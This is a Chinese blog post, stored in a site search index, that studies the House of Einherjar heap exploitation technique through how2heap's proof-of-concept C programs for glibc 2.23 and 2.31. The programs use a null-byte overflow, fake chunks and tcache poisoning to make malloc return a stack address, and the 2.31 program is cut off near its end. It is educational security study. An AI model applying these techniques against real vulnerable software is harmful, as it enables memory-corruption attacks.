<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>house_of_einherjar</title>
    <link href="/2022/07/11/house-of-einherjar/"/>
    <url>/2022/07/11/house-of-einherjar/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>本篇同样是跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>来学习。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Credit to st4g3r for publishing this technique</span><br><span class="hljs-comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="hljs-comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* d;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br><span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">// create a fake chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br><span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br>fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br>fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br>   <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br>   <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br><span class="hljs-comment">// Write a fake prev_size to the end of a</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br>   <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br><span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//if we allocate another chunk before we free b we will need to </span><br><span class="hljs-comment">//do two things: </span><br><span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br><span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br><span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br><span class="hljs-comment">//at the location we control. </span><br><span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br><span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span><br><span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br><span class="hljs-comment">//wilderness</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码虽然比较长，但是比较容易理解。<br>首先堆块布局如图所示。这里的fake_size就是fake_chunk和b的距离，是为了在free(b)后与前面已经释放的堆块（prev_inuse为0）合并，从而下一次malloc的时候可以在fake_chunk处（栈上）申请堆块，就使得malloc可控（当然在fake_chunk在堆上也可以）。<br><img src="https://i.imgur.com/n8DaXjA.png"><br>这里解释一下fake_chunk数组每个元素的作用，我们可以先把他们注释掉，然后查看报错原因去malloc源码里查。<br>首先注释掉fake_chunk[2]和fake_chunk[3]，我们可以看到报错原因如下，我们在<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">网站</a>查找报错原因，可以看到需要通过检查<code>(fd-&gt;bk != p || bk-&gt;fd != p</code>,所以设置fake_chunk的fd和bk都为自己本身来通过检查。<br><img src="https://i.imgur.com/N1JrF1K.png"><br><img src="https://i.imgur.com/RDUyhU6.png"></p><p>然后注释掉fake_chunk[4]和fake_chunk[5]，我们可以看到报错原因如下，是因为需要通过检查<code>p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p</code>，所以设置fake_chunk的fd_nextsize和bk_nextsize指向自身。为什么要走这条分支呢，是因为我们的fake_chunk的size设置的非常大，满足了<code>!in_smallbin_range (chunksize_nomask (p)</code>。<br><img src="https://i.imgur.com/VjxkxkZ.png"></p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>2.31最主要是因为加入了tcache导致了利用稍微复杂一点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.31.</span><br><span class="hljs-comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span><br><span class="hljs-comment">     * It has the additional requirement of a heap leak. </span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span><br><span class="hljs-comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span><br><span class="hljs-comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span><br><span class="hljs-comment">     * allocated from the system in this arena:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span><br><br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span><br>           <span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);<br><br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="hljs-type">char</span> *) &amp;stack_var);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br>    <span class="hljs-comment">// create a fake chunk</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><br>    a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// prev_size (Not Used)</span><br>    a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>    a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// fwd</span><br>    a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// bck</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, a[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span><br>           <span class="hljs-string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span><br>           <span class="hljs-string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);<br>    <span class="hljs-type">uint8_t</span> *b = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>    <span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);<br><br>    <span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);<br>    <span class="hljs-type">uint8_t</span> *c = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>    <span class="hljs-type">uint64_t</span>* c_size_ptr = (<span class="hljs-type">uint64_t</span>*)(c - <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);<br>    b[real_b_size] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span><br>           <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><br>    <span class="hljs-comment">// Write a fake prev_size to the end of b</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span><br>           <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((c - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*) a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>, a, fake_size);<br>    *(<span class="hljs-type">size_t</span>*) &amp;b[real_b_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    <span class="hljs-comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);<br>    a[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nFill tcache.\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">sizeof</span>(x)/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fill up tcache list.\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">sizeof</span>(x)/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x158</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);<br><br>    <span class="hljs-comment">// tcache poisoning</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span><br>           <span class="hljs-string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);<br>    <span class="hljs-type">uint8_t</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">free</span>(pad);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);<br>    d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>) stack_var;<br><br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.\n&quot;</span>);<br>    <span 